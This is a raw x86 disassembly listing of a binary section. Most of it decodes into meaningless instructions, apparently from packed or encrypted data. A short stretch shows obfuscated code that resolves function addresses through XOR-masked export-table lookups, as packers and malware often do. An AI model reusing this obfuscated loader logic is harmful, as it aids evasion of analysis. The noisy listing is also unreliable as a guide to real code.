  40f344:	enter  0x5a69,0x9f
  40f348:	jb     0x40f386
  40f34a:	scas   eax,DWORD PTR es:[edi]
  40f34b:	aaa    
  40f34c:	push   esp
  40f34d:	xor    DWORD PTR [eax+esi*1],ecx
  40f350:	pop    ss
  40f351:	imul   ebp,DWORD PTR [eax-0x283e7df7],0x63da3986
  40f35b:	js     0x40f309
  40f35d:	fisttp WORD PTR [edi+0x414e199f]
  40f363:	push   ecx
  40f364:	pop    eax
  40f365:	add    cl,cl
  40f367:	ret    
  40f368:	cs in  eax,dx
  40f36a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f36b:	lock sub al,0xc3
  40f36e:	push   esi
  40f36f:	dec    DWORD PTR [esi+edi*8]
  40f372:	int    0x29
  40f374:	sahf   
  40f375:	and    eax,0x91841054
  40f37a:	es and bl,ch
  40f37d:	ss (bad) 
  40f37f:	rol    DWORD PTR [esi+0x3e55dbce],cl
  40f385:	xchg   ebx,eax
  40f386:	and    esi,edx
  40f388:	push   ds
  40f389:	scas   eax,DWORD PTR es:[edi]
  40f38a:	dec    sp
  40f38c:	and    bl,ah
  40f38e:	fsub   st,st(4)
  40f390:	push   edx
  40f391:	xchg   ebx,eax
  40f392:	out    dx,al
  40f393:	popa   
  40f394:	mov    esp,0xb26a4d34
  40f399:	mov    es,edi
  40f39b:	popf   
  40f39c:	in     eax,dx
  40f39d:	neg    bh
  40f39f:	mov    ds,WORD PTR [esi]
  40f3a1:	and    eax,0xa91234e0
  40f3a6:	icebp  
  40f3a7:	fidivr WORD PTR [ecx*4+0x7198f3fe]
  40f3ae:	mov    bh,0x79
  40f3b0:	rcr    BYTE PTR [edi-0x23],cl
  40f3b3:	sub    al,0x15
  40f3b5:	sbb    edx,ebx
  40f3b7:	addr16 int3 
  40f3b9:	fs or  al,0x39
  40f3bc:	popf   
  40f3bd:	or     bh,ch
  40f3bf:	lock fstp TBYTE PTR [esi]
  40f3c2:	popa   
  40f3c3:	stc    
  40f3c4:	js     0x40f385
  40f3c6:	inc    esp
  40f3c7:	add    ecx,DWORD PTR [ebp-0x1e3b2ca1]
  40f3cd:	add    eax,0x9bb50fae
  40f3d2:	add    dl,BYTE PTR [ebp-0x40]
  40f3d5:	loope  0x40f384
  40f3d7:	xchg   ebx,eax
  40f3d8:	sti    
  40f3d9:	pextrw eax,(bad),0xc5
  40f3db:	inc    eax
  40f3dc:	adc    BYTE PTR ds:0xd7278926,ch
  40f3e2:	adc    edi,DWORD PTR [edi]
  40f3e4:	inc    eax
  40f3e5:	jnp    0x40f444
  40f3e7:	sahf   
  40f3e8:	cmp    ah,BYTE PTR [esi]
  40f3ea:	xchg   DWORD PTR [edx],ebp
  40f3ec:	sti    
  40f3ed:	lods   eax,DWORD PTR ds:[esi]
  40f3ee:	retf   
  40f3ef:	iret   
  40f3f0:	push   cs
  40f3f1:	or     eax,0x1f8b1d74
  40f3f6:	repz fiadd DWORD PTR [eax-0x6b7f307f]
  40f3fd:	das    
  40f3fe:	ins    BYTE PTR es:[edi],dx
  40f3ff:	pop    eax
  40f400:	sub    eax,0x446136db
  40f405:	hlt    
  40f406:	fsubr  DWORD PTR [edi-0x73]
  40f409:	loope  0x40f3dc
  40f40b:	test   BYTE PTR [ebx],ah
  40f40d:	push   eax
  40f40e:	inc    ebp
  40f40f:	loope  0x40f3cc
  40f411:	jne    0x40f3c2
  40f413:	adc    DWORD PTR [ecx],eax
  40f415:	retf   0xca46
  40f418:	push   cs
  40f419:	ins    DWORD PTR es:[edi],dx
  40f41a:	pop    es
  40f41b:	inc    ebp
  40f41c:	js     0x40f3e6
  40f41e:	adc    al,0x63
  40f420:	inc    esp
  40f421:	in     al,0x68
  40f423:	daa    
  40f424:	push   ds
  40f425:	ret    0xbf38
  40f428:	or     eax,0xa98d4074
  40f42d:	pop    esi
  40f42e:	int3   
  40f42f:	lahf   
  40f430:	daa    
  40f431:	mov    eax,0xb60b13de
  40f436:	jmp    0x9cdb:0x9a702440
  40f43d:	gs and DWORD PTR gs:[ecx],esi
  40f441:	dec    ecx
  40f442:	in     al,dx
  40f443:	pop    edi
  40f444:	push   ecx
  40f445:	pxor   mm3,QWORD PTR [edx+ecx*2]
  40f449:	jns    0x40f3ee
  40f44b:	mov    cl,0x16
  40f44d:	retf   
  40f44e:	test   BYTE PTR [ebp+0x3b],cl
  40f451:	pusha  
  40f452:	ret    
  40f453:	add    BYTE PTR [ecx],ch
  40f455:	sub    esi,DWORD PTR [eax+edx*8]
  40f458:	xchg   esp,eax
  40f459:	mov    esi,0x29cd639c
  40f45e:	jmp    0x9c96ee73
  40f463:	loop   0x40f43d
  40f465:	bound  edi,QWORD PTR [eax]
  40f467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f468:	dec    ecx
  40f469:	retf   
  40f46a:	sub    al,BYTE PTR [eax-0x65]
  40f46d:	pop    edx
  40f46e:	inc    eax
  40f46f:	mov    ah,0x27
  40f471:	jmp    0x72e0:0xb5c360b3
  40f478:	push   cs
  40f479:	addr16 pop ss
  40f47b:	push   edi
  40f47c:	push   esi
  40f47d:	cmp    eax,0x69697be6
  40f482:	dec    edi
  40f483:	inc    edx
  40f484:	add    esi,DWORD PTR [eax]
  40f486:	xchg   ecx,eax
  40f487:	sub    BYTE PTR [edx+0x78d21268],bh
  40f48d:	adc    al,0xa6
  40f48f:	pop    eax
  40f490:	rcl    esp,1
  40f492:	out    dx,al
  40f493:	popa   
  40f494:	fwait
  40f495:	sbb    esi,esi
  40f497:	iret   
  40f498:	push   0x344ceb95
  40f49d:	push   0xffffffd1
  40f49f:	je     0x40f426
  40f4a1:	mov    esi,0x224330ec
  40f4a6:	cld    
  40f4a7:	xchg   BYTE PTR [edi+0x12],dh
  40f4aa:	ud0    ebx,DWORD PTR ds:0xab9d3c74
  40f4b1:	stos   DWORD PTR es:[edi],eax
  40f4b2:	push   ds
  40f4b3:	pop    es
  40f4b4:	scas   eax,DWORD PTR es:[edi]
  40f4b5:	adc    BYTE PTR [edi+0x64],dl
  40f4b8:	xlat   BYTE PTR ds:[ebx]
  40f4b9:	pop    esp
  40f4ba:	fwait
  40f4bb:	scas   al,BYTE PTR es:[edi]
  40f4bc:	mov    ?,edx
  40f4be:	xchg   edi,eax
  40f4bf:	lods   al,BYTE PTR ds:[si]
  40f4c1:	xor    al,0xbc
  40f4c3:	stc    
  40f4c4:	push   edx
  40f4c5:	jmp    0xedd8e1e5
  40f4ca:	sub    al,0x65
  40f4cc:	mov    cl,0xaa
  40f4ce:	sbb    BYTE PTR [edx-0x530668a7],0x96
  40f4d5:	xchg   DWORD PTR fs:[edx-0x310226d6],edi
  40f4dc:	adc    esp,DWORD PTR [ebp+0x6f]
  40f4df:	push   ds
  40f4e0:	bound  ebx,QWORD PTR [ecx+ebx*4-0x7b130ad5]
  40f4e7:	xchg   ebx,eax
  40f4e8:	enter  0x42a0,0x2
  40f4ec:	xchg   ebx,eax
  40f4ed:	mov    eax,ds:0x2c8b47f
  40f4f2:	add    bh,BYTE PTR [esi]
  40f4f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4f5:	jl     0x40f4d3
  40f4f7:	cmp    DWORD PTR [edx-0x68],edi
  40f4fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4fb:	pop    ds
  40f4fc:	(bad)  
  40f4fd:	fmul   DWORD PTR [edi]
  40f4ff:	mul    bh
  40f501:	mov    WORD PTR [ecx],ss
  40f503:	sbb    esi,DWORD PTR [edx-0x5]
  40f506:	jae    0x40f4c0
  40f508:	das    
  40f509:	stc    
  40f50a:	jmp    0x40f49c
  40f50c:	loopne 0x40f4d5
  40f50e:	iret   
  40f50f:	xor    eax,0xbce5aeff
  40f514:	push   edi
  40f515:	into   
  40f516:	jo     0x40f519
  40f518:	push   0xe0033c61
  40f51d:	cdq    
  40f51e:	fist   DWORD PTR [edi-0x66]
  40f521:	sbb    ebx,DWORD PTR [ebp-0x54]
  40f524:	pop    ecx
  40f525:	fsqrt  
  40f527:	out    0x65,eax
  40f529:	xchg   ebp,eax
  40f52a:	hlt    
  40f52b:	and    DWORD PTR [edi+esi*1],edi
  40f52e:	pop    ds
  40f52f:	push   ss
  40f530:	retf   
  40f531:	aam    0x3c
  40f533:	push   esi
  40f534:	mov    eax,0xdfc9df17
  40f539:	or     BYTE PTR [ebx-0x1958de27],dh
  40f53f:	sub    ebx,DWORD PTR [ecx-0x12c0849e]
  40f545:	es sub ebx,esp
  40f548:	mov    edx,0x791856fe
  40f54d:	cmp    esp,DWORD PTR [esi]
  40f54f:	sub    bl,BYTE PTR [esp+eax*4-0x75]
  40f553:	fimul  WORD PTR ds:0xe996be99
  40f559:	lods   al,BYTE PTR ds:[esi]
  40f55a:	mov    esp,0xe85f83ba
  40f55f:	dec    ecx
  40f560:	mov    cl,0xa4
  40f562:	mov    al,0x51
  40f564:	int    0x76
  40f566:	aam    0x84
  40f568:	or     ecx,0xde508678
  40f56e:	stos   BYTE PTR es:[edi],al
  40f56f:	jl     0x40f5b1
  40f571:	cdq    
  40f572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f573:	mov    ds:0xdea6f474,al
  40f578:	jo     0x40f4fa
  40f57a:	xor    DWORD PTR [edi+0x73],esi
  40f57d:	test   eax,0xd4474c94
  40f582:	hlt    
  40f583:	adc    ebx,DWORD PTR [eax+0x0]
  40f586:	and    dl,ch
  40f588:	shr    BYTE PTR [esi-0x41],1
  40f58b:	and    DWORD PTR [bp+0x16a2],edi
  40f590:	fimul  WORD PTR [esi+0x68]
  40f593:	mov    DWORD PTR [edi-0x1c70aab7],esp
  40f599:	add    esp,DWORD PTR [ecx]
  40f59b:	push   edi
  40f59c:	popf   
  40f59d:	mov    cl,0xad
  40f59f:	pop    ebx
  40f5a0:	cli    
  40f5a1:	mov    DWORD PTR [ebx+0x2c921fe4],edi
  40f5a7:	je     0x40f5ed
  40f5a9:	(bad)  
  40f5aa:	push   eax
  40f5ab:	push   0xffffffab
  40f5ad:	pop    ebx
  40f5ae:	mul    ebx
  40f5b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5b1:	mov    ecx,0x8bc83bc5
  40f5b6:	inc    ebp
  40f5b7:	cld    
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi-0x55a3da05]
  40f687:	les    ebx,FWORD PTR [eax-0x7c503cc1]
  40f68d:	xor    ecx,0x60
  40f690:	add    DWORD PTR [ebx+0x9357214],0x2c
  40f697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f698:	and    ah,dl
  40f69a:	loope  0x40f6c6
  40f69c:	addr16 sti 
  40f69e:	pusha  
  40f69f:	aas    
  40f6a0:	and    bl,BYTE PTR [edi-0x4ead065]
  40f6a6:	cld    
  40f6a7:	call   0x9c10:0xf8b79d19
  40f6ae:	out    dx,eax
  40f6af:	ss xchg ebx,eax
  40f6b1:	and    eax,0x7c36b4eb
  40f6b6:	jo     0x40f657
  40f6b8:	inc    ecx
  40f6b9:	imul   ebx,DWORD PTR [ebx],0xc165d49a
  40f6bf:	jbe    0x40f643
  40f6c1:	dec    esi
  40f6c2:	or     dh,bl
  40f6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6c5:	scas   eax,DWORD PTR es:[edi]
  40f6c6:	inc    esp
  40f6c7:	inc    ecx
  40f6c8:	dec    ebp
  40f6c9:	sbb    eax,0x43a6908e
  40f6ce:	fbstp  TBYTE PTR [esi+0x13]
  40f6d1:	aaa    
  40f6d2:	mov    al,0x7
  40f6d4:	push   esp
  40f6d5:	sbb    ebx,edi
  40f6d7:	jno    0x40f6a1
  40f6d9:	outs   dx,DWORD PTR ds:[esi]
  40f6da:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6dc:	stos   DWORD PTR es:[edi],eax
  40f6dd:	in     eax,0x61
  40f6df:	test   eax,0x3843217d
  40f6e4:	ret    0xc21
  40f6e7:	shl    BYTE PTR [ecx],0x70
  40f6ea:	sar    dh,0xd5
  40f6ed:	or     ecx,edi
  40f6ef:	ret    0xb0a1
  40f6f2:	jle    0x40f742
  40f6f4:	in     eax,dx
  40f6f5:	js     0x40f6ec
  40f6f7:	hlt    
  40f6f8:	mov    dl,0x6a
  40f6fa:	lock pop eax
  40f6fc:	push   0xe010897c
  40f701:	outs   dx,DWORD PTR ds:[esi]
  40f702:	into   
  40f703:	sbb    eax,0xc2e86da7
  40f708:	pop    esp
  40f709:	out    dx,al
  40f70a:	ss popa 
  40f70c:	out    0x1,al
  40f70e:	ja     0x40f73a
  40f710:	or     BYTE PTR [edx],ah
  40f712:	mov    ds:0x7c97c1c7,al
  40f717:	in     eax,dx
  40f718:	aam    0xee
  40f71a:	dec    eax
  40f71b:	repnz std 
  40f71d:	fprem1 
  40f71f:	xor    al,0xe5
  40f721:	ins    DWORD PTR es:[edi],dx
  40f722:	mov    WORD PTR [edi+edi*4-0x62af913a],gs
  40f729:	xor    al,0x69
  40f72b:	mov    ?,eax
  40f72d:	rcl    BYTE PTR [edi],1
  40f72f:	out    dx,eax
  40f730:	mov    edx,0xf94ab1a8
  40f735:	(bad)  
  40f736:	(bad)  
  40f737:	push   ss
  40f738:	fwait
  40f739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f73a:	fmul   QWORD PTR [edx+0x6b]
  40f73d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f73e:	std    
  40f73f:	fld    DWORD PTR [edi]
  40f741:	mov    bl,al
  40f743:	jb     0x40f72f
  40f745:	popf   
  40f746:	mov    dh,0xa1
  40f748:	je     0x40f720
  40f74a:	adc    DWORD PTR [ecx+0x1e758a12],esi
  40f750:	cs pop ecx
  40f752:	push   esp
  40f753:	sbb    eax,0xbf96a813
  40f758:	sub    DWORD PTR [eax+0x443423e4],ebp
  40f75e:	aam    0x81
  40f760:	cmp    BYTE PTR [esi+0x5c1d25e8],bh
  40f766:	adc    ah,BYTE PTR [ecx+0x6e66971b]
  40f76c:	(bad)  
  40f76d:	or     dh,BYTE PTR [edi-0x3f]
  40f770:	dec    esp
  40f771:	or     ebx,edx
  40f773:	xor    dl,BYTE PTR [ecx]
  40f775:	mov    DWORD PTR [ebx],edi
  40f777:	loopne 0x40f7c6
  40f779:	imul   ebp,eax,0xa053f55c
  40f77f:	lods   al,BYTE PTR ds:[esi]
  40f780:	xchg   edi,eax
  40f781:	test   al,0x1f
  40f783:	mov    bh,0x2d
  40f785:	shl    BYTE PTR [ebx+0x4a],1
  40f788:	add    eax,0x935299f2
  40f78d:	leave  
  40f78e:	mov    ds:0xf55ca1c2,al
  40f793:	fwait
  40f794:	xor    eax,0xa778349a
  40f799:	pop    ebp
  40f79a:	jno    0x40f7fd
  40f79c:	xchg   esp,eax
  40f79d:	adc    ecx,DWORD PTR [eax]
  40f79f:	cmp    ch,0x2d
  40f7a2:	or     BYTE PTR [ecx+0x2d],ah
  40f7a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7a6:	in     eax,0x9b
  40f7a8:	ss push esi
  40f7aa:	sub    BYTE PTR [edx+0x57],cl
  40f7ad:	fnsave [ebx+0x591df489]
  40f7b3:	imul   esi,edx,0x95b4415a
  40f7b9:	loope  0x40f785
  40f7bb:	sti    
  40f7bc:	das    
  40f7bd:	jnp    0x40f7ec
  40f7bf:	lea    esp,[edx-0x2f]
  40f7c2:	pop    eax
  40f7c3:	lds    ebp,FWORD PTR ds:0x4b25fe90
  40f7c9:	pop    ds
  40f7ca:	sub    DWORD PTR [ebp+0x45e5398d],0xfffffff9
  40f7d1:	cli    
  40f7d2:	mov    esp,0x2d558541
  40f7d7:	lahf   
  40f7d8:	pop    esi
  40f7d9:	pop    ecx
  40f7da:	nop
  40f7db:	jecxz  0x40f79b
  40f7dd:	sbb    eax,0xfdcbeb67
  40f7e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7e3:	fwait
  40f7e4:	sub    BYTE PTR [ebp-0x3dabcd00],0x83
  40f7eb:	int    0x1f
  40f7ed:	jbe    0x40f7b7
  40f7ef:	xchg   dl,cl
  40f7f1:	and    eax,0xd237f3d7
  40f7f6:	mov    fs,edx
  40f7f8:	js     0x40f864
  40f7fa:	push   edx
  40f7fb:	js     0x40f788
  40f7fd:	enter  0xf045,0x33
  40f801:	pop    edi
  40f802:	jns    0x40f87b
  40f804:	xor    BYTE PTR [ebp-0x8c254ed],bh
  40f80a:	xchg   esp,eax
  40f80b:	ss clc 
  40f80d:	mov    ds:0xdd102b2c,eax
  40f812:	pop    edi
  40f813:	(bad)  
  40f814:	push   ebp
  40f815:	test   DWORD PTR [edi],0x5c7f6133
  40f81b:	push   0x9f9de5c
  40f820:	jno    0x40f7c5
  40f822:	jmp    0x40f7b1
  40f824:	imul   edx,DWORD PTR [edx+0x6624608b],0x24
  40f82b:	adc    esi,DWORD PTR [ecx-0x576ba999]
  40f831:	pushf  
  40f832:	in     eax,0x41
  40f834:	mov    edi,0x602f6d84
  40f839:	ins    DWORD PTR es:[edi],dx
  40f83a:	test   eax,0x14482f80
  40f83f:	jg     0x40f890
  40f841:	imul   esi,DWORD PTR ds:0xa5332398,0xbf837faf
  40f84b:	xchg   ebx,eax
  40f84c:	adc    BYTE PTR [edi+0x63],cl
  40f84f:	mov    al,ds:0x4986e983
  40f854:	sub    eax,0x9da04c26
  40f859:	sub    DWORD PTR [edi-0x386290a6],esi
  40f85f:	pop    eax
  40f860:	aaa    
  40f861:	dec    ebp
  40f862:	bound  esp,QWORD PTR [ebx]
  40f864:	cwde   
  40f865:	xchg   esi,eax
  40f866:	xor    DWORD PTR [ebp+0x26],0xffffffed
  40f86a:	xchg   ebp,eax
  40f86b:	hlt    
  40f86c:	inc    esp
  40f86d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f86e:	mov    eax,ds:0xff5078b1
  40f873:	mov    edx,0x787a00a0
  40f878:	(bad)  [edx-0x529753c6]
  40f87e:	(bad)  
  40f87f:	ffree  st(2)
  40f881:	imul   ebx,esi,0xffffffbe
  40f884:	bound  ebp,QWORD PTR [ecx]
  40f886:	retf   0x7226
  40f889:	pop    ds
  40f88a:	in     al,dx
  40f88b:	mov    ecx,0xf6fd2e1c
  40f890:	push   ebx
  40f891:	and    ebp,ecx
  40f893:	sub    DWORD PTR [ebp+0x22],esp
  40f896:	fs jbe 0x40f8c1
  40f899:	fucom  st(1)
  40f89b:	push   es
  40f89c:	cmc    
  40f89d:	mov    eax,0xc22a1a37
  40f8a2:	outs   dx,BYTE PTR ds:[esi]
  40f8a3:	addr16 repnz xchg esi,eax
  40f8a6:	in     al,dx
  40f8a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a8:	dec    esp
  40f8a9:	test   eax,0x41a56320
  40f8ae:	cwde   
  40f8af:	push   esi
  40f8b0:	je     0x40f8b3
  40f8b2:	dec    ecx
  40f8b3:	out    0x6a,al
  40f8b5:	test   BYTE PTR [eax+0x5b93bf46],0x99
  40f8bc:	stc    
  40f8bd:	mov    bh,0x84
  40f8bf:	psubw  mm5,mm3
  40f8c2:	lahf   
  40f8c3:	pusha  
  40f8c4:	je     0x40f899
  40f8c6:	call   0x40ce:0xd344b63d
  40f8cd:	std    
  40f8ce:	push   ss
  40f8cf:	jmp    0xb0773c87
  40f8d4:	xor    BYTE PTR [ecx-0x47],0x9a
  40f8d8:	and    al,dl
  40f8da:	xor    DWORD PTR [ebx-0x71],0x4aa99566
  40f8e1:	dec    esi
  40f8e2:	jle    0x40f959
  40f8e4:	aad    0xab
  40f8e6:	cdq    
  40f8e7:	(bad)  
  40f8e8:	jmp    0xf0d4993d
  40f8ed:	rcl    bl,1
  40f8ef:	repnz sub BYTE PTR [ebp-0x5c],dl
  40f8f3:	popa   
  40f8f4:	inc    BYTE PTR [ebp+0x155ca46d]
  40f8fa:	mov    bl,0x72
  40f8fc:	outs   dx,BYTE PTR ds:[esi]
  40f8fd:	inc    eax
  40f8fe:	dec    esp
  40f8ff:	inc    ebx
  40f900:	lds    esi,FWORD PTR [eax-0x486d0f1a]
  40f906:	jno    0x40f8d6
  40f908:	or     al,0xa7
  40f90a:	retf   0x5cfc
  40f90d:	jmp    0x2329:0xbe51ea56
  40f914:	mov    edi,0x67b94538
  40f919:	push   ecx
  40f91a:	outs   dx,DWORD PTR ds:[esi]
  40f91b:	pop    ecx
  40f91c:	xlat   BYTE PTR ds:[ebx]
  40f91d:	xlat   BYTE PTR ds:[ebx]
  40f91e:	push   ebx
  40f91f:	(bad)  
  40f920:	mov    ebp,0x44d641e6
  40f925:	jmp    0x40f997
  40f927:	(bad)  
  40f928:	scas   al,BYTE PTR es:[edi]
  40f929:	fdiv   st(7),st
  40f92b:	imul   ebx,DWORD PTR [edi-0x50],0x61
  40f92f:	jnp    0x40f918
  40f931:	mov    cl,0xaa
  40f933:	jb     0x40f968
  40f935:	scas   eax,DWORD PTR es:[edi]
  40f936:	push   0x77f9700c
  40f93b:	loop   0x40f8f5
  40f93d:	(bad)  
  40f93e:	cmp    al,0x6f
  40f940:	mov    ecx,0x31d43804
  40f945:	mov    ch,0xb0
  40f947:	out    dx,eax
  40f948:	and    al,0xd0
  40f94a:	adc    al,BYTE PTR [edi]
  40f94c:	loopne 0x40f999
  40f94e:	mov    ch,0x9f
  40f950:	daa    
  40f951:	hlt    
  40f952:	and    edx,eax
  40f954:	(bad)  
  40f955:	retf   
  40f956:	inc    edx
  40f957:	jmp    0xdd6dac05
  40f95c:	aad    0xfe
  40f95e:	sub    bl,BYTE PTR [eax-0x67]
  40f961:	outs   dx,DWORD PTR ds:[esi]
  40f962:	icebp  
  40f963:	repz popf 
  40f965:	loopne 0x40f986
  40f967:	aas    
  40f968:	aas    
  40f969:	xor    edx,DWORD PTR [ebx]
  40f96b:	or     BYTE PTR [eax+eiz*1+0x3],bh
  40f96f:	nop
  40f970:	jecxz  0x40f97f
  40f972:	cdq    
  40f973:	cli    
  40f974:	and    eax,0x4c89086c
  40f979:	call   0x6e1e:0x40c0da1f
  40f980:	jno    0x40f948
  40f982:	inc    ebx
  40f983:	and    edi,0x5f678983
  40f989:	inc    esi
  40f98a:	jp     0x40f953
  40f98c:	mov    ecx,0xa44121b6
  40f991:	ins    BYTE PTR es:[edi],dx
  40f992:	fadd   st(3),st
  40f994:	hlt    
  40f995:	aaa    
  40f996:	jbe    0x40f96f
  40f998:	sub    edi,eax
  40f99a:	jae    0x40f969
  40f99c:	add    BYTE PTR [eax],0xc7
  40f99f:	sbb    esi,DWORD PTR [ebp+ecx*1-0x1b]
  40f9a3:	rcl    BYTE PTR [ecx],0x44
  40f9a6:	aaa    
  40f9a7:	fwait
  40f9a8:	dec    ebp
  40f9a9:	rcr    DWORD PTR [ecx],1
  40f9ab:	xor    DWORD PTR [eax+0x6e],esp
  40f9ae:	adc    DWORD PTR [edx-0x7f],ecx
  40f9b1:	std    
  40f9b2:	(bad)  
  40f9b3:	or     eax,0x7cfe9152
  40f9b8:	aad    0x19
  40f9ba:	(bad)  
  40f9bd:	ins    BYTE PTR es:[edi],dx
  40f9be:	or     BYTE PTR [esi-0x66],dl
  40f9c1:	jnp    0x40fa2f
  40f9c3:	jns    0x40f9f2
  40f9c5:	mov    eax,ds:0x23d8dbbf
  40f9ca:	xchg   esp,eax
  40f9cb:	retf   0xb950
  40f9ce:	mov    al,dl
  40f9d0:	fs stos BYTE PTR es:[edi],al
  40f9d2:	mov    eax,0xb8e52c62
  40f9d7:	aaa    
  40f9d8:	ss cmc 
  40f9da:	and    BYTE PTR [ecx+eax*4+0x5d592cbc],bh
  40f9e1:	jne    0x40fa35
  40f9e3:	aas    
  40f9e4:	xchg   esp,eax
  40f9e5:	mov    esp,0xb8336da7
  40f9ea:	add    al,0x2c
  40f9ec:	pop    es
  40f9ed:	sub    ecx,edx
  40f9ef:	sbb    BYTE PTR [edx-0x31],bl
  40f9f2:	dec    esp
  40f9f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9f4:	stc    
  40f9f5:	dec    eax
  40f9f7:	and    BYTE PTR [ecx],0xe5
  40f9fa:	pop    ebp
  40f9fb:	adc    edx,DWORD PTR [eax+0x57]
  40f9fe:	xor    BYTE PTR [eax-0x4a],bl
  40fa01:	dec    ecx
  40fa02:	adc    eax,0x6e1980ba
  40fa07:	inc    edi
  40fa08:	or     bl,ah
  40fa0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa0b:	ins    DWORD PTR es:[edi],dx
  40fa0c:	mov    eax,ds:0x4e2038c9
  40fa11:	push   cs
  40fa12:	mov    ds,edx
  40fa14:	dec    eax
  40fa15:	adc    al,0x9a
  40fa17:	shl    BYTE PTR [ebp+ebx*2-0x29],0xc5
  40fa1c:	repnz jecxz 0x40f9b9
  40fa1f:	fistp  WORD PTR ds:0x774b7e69
  40fa25:	fisttp DWORD PTR [ebx-0x53585c05]
  40fa2b:	loop   0x40fa1d
  40fa2d:	add    ecx,0x28
  40fa30:	in     eax,dx
  40fa31:	mov    cl,0x99
  40fa33:	shl    esi,1
  40fa35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa36:	push   ebx
  40fa37:	scas   al,BYTE PTR es:[edi]
  40fa38:	test   BYTE PTR [edi+0x6c3f6e16],ah
  40fa3e:	fadd   st(5),st
  40fa40:	or     edx,ebp
  40fa42:	xor    al,0x4
  40fa44:	sub    al,BYTE PTR [esi]
  40fa46:	pop    es
  40fa47:	mov    BYTE PTR ds:0xfb7b588,bh
  40fa4d:	ins    BYTE PTR es:[edi],dx
  40fa4e:	xor    eax,0xaf5bf185
  40fa53:	and    al,0x88
  40fa55:	xchg   ebx,eax
  40fa56:	(bad)  
  40fa57:	loope  0x40fa66
  40fa59:	stos   BYTE PTR es:[edi],al
  40fa5a:	jecxz  0x40fa1a
  40fa5c:	fidiv  DWORD PTR [ebp-0x73f1b16d]
  40fa62:	mov    cl,0xca
  40fa64:	push   ds
  40fa65:	les    esi,FWORD PTR cs:[eax+edx*4+0x3]
  40fa6a:	mov    dh,0x5
  40fa6c:	dec    ebp
  40fa6d:	ret    
  40fa6e:	mov    bl,0x92
  40fa70:	inc    esp
  40fa71:	adc    al,0x76
  40fa73:	inc    esi
  40fa74:	mov    ecx,0xa21d0aca
  40fa79:	fimul  DWORD PTR [ebx-0x72]
  40fa7c:	mul    BYTE PTR [ecx]
  40fa7e:	pop    esp
  40fa7f:	lods   eax,DWORD PTR ds:[esi]
  40fa80:	mov    ds:0x2827d20,al
  40fa85:	test   BYTE PTR [ebp+0x58d0edcd],bl
  40fa8b:	xchg   BYTE PTR [ebp-0x5a802a7b],dh
  40fa91:	sub    al,0x2b
  40fa93:	jns    0x40fa90
